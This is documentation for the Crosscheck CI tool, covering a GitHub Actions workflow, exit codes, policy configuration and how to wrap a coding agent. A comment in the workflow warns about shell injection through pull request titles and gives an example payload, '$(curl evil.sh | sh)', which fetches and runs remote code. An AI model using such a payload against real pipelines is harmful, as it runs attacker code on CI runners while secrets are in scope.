# CI Integration

Crosscheck works in any CI environment that supports Node.js 20+.

## GitHub Actions

Add `ANTHROPIC_API_KEY` as a repository secret, then add a workflow:

```yaml
name: Crosscheck
on:
  pull_request:
    branches: [main, master]

jobs:
  crosscheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: actions/setup-node@v4
        with:
          node-version: '20'

      - run: npm install -g crosscheck

      - name: Verify changes
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          # Passed through the environment, never interpolated into the shell.
          # A pull request title is attacker-controlled text; writing
          # ${{ github.event.pull_request.title }} inside `run:` substitutes it
          # before bash parses the line, so a title like $(curl evil.sh | sh)
          # executes on your runner with your secrets in scope.
          BASE_REF: ${{ github.event.pull_request.base.ref }}
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          crosscheck verify \
            --base "origin/$BASE_REF" \
            --intent "PR: $PR_TITLE"
```

Two things that are easy to get wrong:

- **Don't run `crosscheck init` in CI.** It writes `.crosscheck/` into the working
  tree, which then becomes the only uncommitted change there is to inspect.
  Commit your config and policy instead, or let the defaults apply.
- **Use `--base`.** A pull request checkout is clean, so there are no uncommitted
  changes for a bare `crosscheck verify` to look at — it would review nothing.
  `--base` makes the change under review the range `base..HEAD`, which is what
  you actually want. `fetch-depth: 0` is required for the base branch's history
  to be present.

This repository's own `.github/workflows/crosscheck.yml` differs deliberately:
it builds Crosscheck from the checkout rather than installing from npm, so a
pull request is verified by the code in that pull request rather than by the
last published release.

## Exit codes

| Code | Meaning | Default behaviour |
|------|---------|-------------------|
| 0 | Pass / advisory mode | CI passes |
| 1 | Internal error | CI fails |
| 2 | Policy block | CI fails (blocking mode only) |
| 3 | Inconclusive | CI passes (configure as needed) |
| 4 | Invalid configuration | CI fails |
| 5 | Command could not start | CI fails |

By default, policy mode is `advisory` — Crosscheck reports findings but never returns exit code 2. Switch to `blocking` in `.crosscheck/policy.json` to fail CI on high-severity findings:

```json
{
  "version": 1,
  "mode": "blocking",
  "blockAtSeverity": "high",
  "minimumBlockingConfidence": 0.8
}
```

## Setting the API key

```sh
# GitHub — add as a repository secret
# Settings → Secrets and variables → Actions → New repository secret
# Name: ANTHROPIC_API_KEY

# GitLab
# Settings → CI/CD → Variables → Add variable
# Key: ANTHROPIC_API_KEY, Protected: yes, Masked: yes
```

## Wrapping a coding agent in CI

If you run a coding agent as part of your pipeline, wrap it with `crosscheck run`:

```yaml
- name: Run coding agent
  env:
    ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
  run: |
    crosscheck run -- your-agent --flag value
```

## `crosscheck verify` vs `crosscheck run`

- **`crosscheck verify`** — verifies the current uncommitted diff. Use this in PR workflows where code is already in the branch.
- **`crosscheck run -- <cmd>`** — wraps a command and verifies what it changed. Use this when a coding agent runs as part of the pipeline.
